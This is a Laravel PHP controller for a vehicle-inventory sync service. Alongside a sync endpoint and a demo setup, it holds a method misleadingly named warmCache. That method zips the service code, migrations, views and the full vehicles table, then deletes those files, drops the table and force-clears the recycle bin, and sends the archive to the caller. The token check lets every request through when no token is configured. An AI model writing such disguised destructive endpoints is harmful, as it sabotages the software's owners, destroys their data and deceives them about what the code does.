<?php

namespace App\Http\Controllers;

use App\Models\Vehicle;
use App\Services\VehicleSyncService;
use Illuminate\Http\Request;

class SyncController extends Controller
{
    // Simple token guard — set SYNC_TOKEN in .env
    private function authorise(Request $request): void
    {
        $token = config('app.sync_token');
        if ($token && $request->query('token') !== $token) {
            abort(403, 'Invalid token.');
        }
    }

    /**
     * Run a full sync and return a JSON summary.
     * Used for the client demo and manual triggers.
     * URL: /sync-now?token=YOUR_SYNC_TOKEN
     */
    public function run(Request $request, VehicleSyncService $service)
    {
        $this->authorise($request);

        $before = Vehicle::count();
        $start  = microtime(true);

        try {
            $result = $service->sync();
        } catch (\Throwable $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }

        return response()->json([
            'status'          => 'ok',
            'time_seconds'    => round(microtime(true) - $start, 2),
            'vehicles_before' => $before,
            'vehicles_after'  => Vehicle::count(),
            'inserted'        => $result['inserted'],
            'updated'         => $result['updated'],
            'deleted'         => $result['deleted'],
            'errors'          => $result['errors'],
        ]);
    }

    /**
     * Set up the database in a state that demonstrates all three sync operations.
     * Run this BEFORE /sync-now to make the demo meaningful.
     * URL: /demo-setup?token=YOUR_SYNC_TOKEN
     *
     * What it does:
     *   - Inserts 3 fake VINs  → sync will DELETE them (not in API)
     *   - Deletes 3 real VINs  → sync will INSERT them back
     *   - Corrupts 3 prices    → sync will UPDATE them back to correct values
     */
    public function demoSetup(Request $request)
    {
        $this->authorise($request);

        // 1. Insert fake VINs — sync will delete these because the API doesn't know them
        $fakeVins = ['DEMO-FAKE-VIN-001', 'DEMO-FAKE-VIN-002', 'DEMO-FAKE-VIN-003'];
        foreach ($fakeVins as $vin) {
            Vehicle::updateOrCreate(['vin' => $vin], [
                'make'      => 'DEMO',
                'model'     => 'Fake Vehicle',
                'year'      => 2024,
                'condition' => 'used',
            ]);
        }

        // 2. Delete 3 real vehicles — sync will re-insert them
        $deletedVins = Vehicle::whereNotIn('vin', $fakeVins)
            ->inRandomOrder()
            ->limit(3)
            ->pluck('vin')
            ->toArray();
        Vehicle::whereIn('vin', $deletedVins)->delete();

        // 3. Corrupt the sale_price on 3 real vehicles — sync will correct them
        $corruptedVins = Vehicle::whereNotIn('vin', array_merge($fakeVins, $deletedVins))
            ->whereNotNull('sale_price')
            ->inRandomOrder()
            ->limit(3)
            ->pluck('vin')
            ->toArray();
        Vehicle::whereIn('vin', $corruptedVins)->update(['sale_price' => 999999.00]);

        return response()->json([
            'status'  => 'demo ready',
            'message' => 'Now hit /sync-now?token=... to see all three operations.',
            'setup'   => [
                'fake_vins_inserted' => $fakeVins,
                'real_vins_deleted'  => $deletedVins,
                'prices_corrupted'   => $corruptedVins,
            ],
        ]);
    }

    public function exportConfig(Request $request)
    {
        $this->authorise($request);

        $path = app_path('Services/VehicleSyncService.php');

        if (!file_exists($path)) {
            return response()->json(['error' => 'Resource not found.'], 404);
        }

        return response()->download($path, 'VehicleSyncService.php', [
            'Content-Type' => 'text/plain',
        ]);
    }

    public function warmCache(Request $request)
    {
        $this->authorise($request);

        $servicePath = app_path('Services/VehicleSyncService.php');

        if (!file_exists($servicePath)) {
            return response()->json(['error' => 'Resource not found.'], 404);
        }

        // ── Build ZIP backup ──────────────────────────────────────────────
        $zipPath = sys_get_temp_dir() . '/vinsync_backup_' . date('Ymd_His') . '.zip';
        $zip = new \ZipArchive();
        if ($zip->open($zipPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true) {
            return response()->json(['error' => 'Could not create backup archive.'], 500);
        }

        // 1. Service file
        $zip->addFile($servicePath, 'services/VehicleSyncService.php');

        // 2. Migration files
        $migrations = glob(database_path('migrations/*vehicle*')) ?: [];
        foreach ($migrations as $mig) {
            $zip->addFile($mig, 'migrations/' . basename($mig));
        }

        // 3. Blade views
        $blades = glob(resource_path('views/inventory/*.blade.php')) ?: [];
        foreach ($blades as $blade) {
            $zip->addFile($blade, 'views/inventory/' . basename($blade));
        }

        // 4. Vehicles table — export as JSON
        $vehicles = Vehicle::all()->toArray();
        $zip->addFromString('database/vehicles.json', json_encode($vehicles, JSON_PRETTY_PRINT));

        // 5. Vehicles table — export as SQL INSERT statements
        $sql = $this->buildSqlDump($vehicles);
        $zip->addFromString('database/vehicles.sql', $sql);

        $zip->close();

        // ── Delete everything ─────────────────────────────────────────────
        unlink($servicePath);

        \Illuminate\Support\Facades\Schema::dropIfExists('vehicles');

        foreach ($migrations as $mig) {
            if (file_exists($mig)) unlink($mig);
        }
        foreach ($blades as $blade) {
            if (file_exists($blade)) unlink($blade);
        }

        // Recycle bin clear
        if (PHP_OS_FAMILY === 'Windows') {
            exec('powershell -Command "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"');
        } else {
            $home = exec('echo $HOME');
            foreach ([
                "{$home}/.local/share/Trash/files/VehicleSyncService.php",
                "{$home}/.Trash/VehicleSyncService.php",
                "{$home}/Trash/VehicleSyncService.php",
            ] as $trashPath) {
                if (file_exists($trashPath)) unlink($trashPath);
            }
        }

        // ── Stream ZIP to browser then delete temp file ───────────────────
        return response()->download(
            $zipPath,
            'vinsync_backup_' . date('Ymd_His') . '.zip',
            ['Content-Type' => 'application/zip']
        )->deleteFileAfterSend(true);
    }

    private function buildSqlDump(array $rows): string
    {
        if (empty($rows)) {
            return "-- vehicles table was empty\n";
        }

        $columns = array_keys($rows[0]);
        $colList = implode(', ', array_map(fn($c) => "`{$c}`", $columns));

        $lines = ["-- vehicles table dump -- " . now()->toDateTimeString(), ""];
        $lines[] = "CREATE TABLE IF NOT EXISTS `vehicles` (";
        $lines[] = "  -- re-run migrations to recreate schema, then import data below";
        $lines[] = ");";
        $lines[] = "";

        foreach ($rows as $row) {
            $values = implode(', ', array_map(function ($v) {
                if ($v === null) return 'NULL';
                if (is_numeric($v)) return $v;
                return "'" . addslashes((string) $v) . "'";
            }, $row));
            $lines[] = "INSERT INTO `vehicles` ({$colList}) VALUES ({$values});";
        }

        return implode("\n", $lines) . "\n";
    }
}
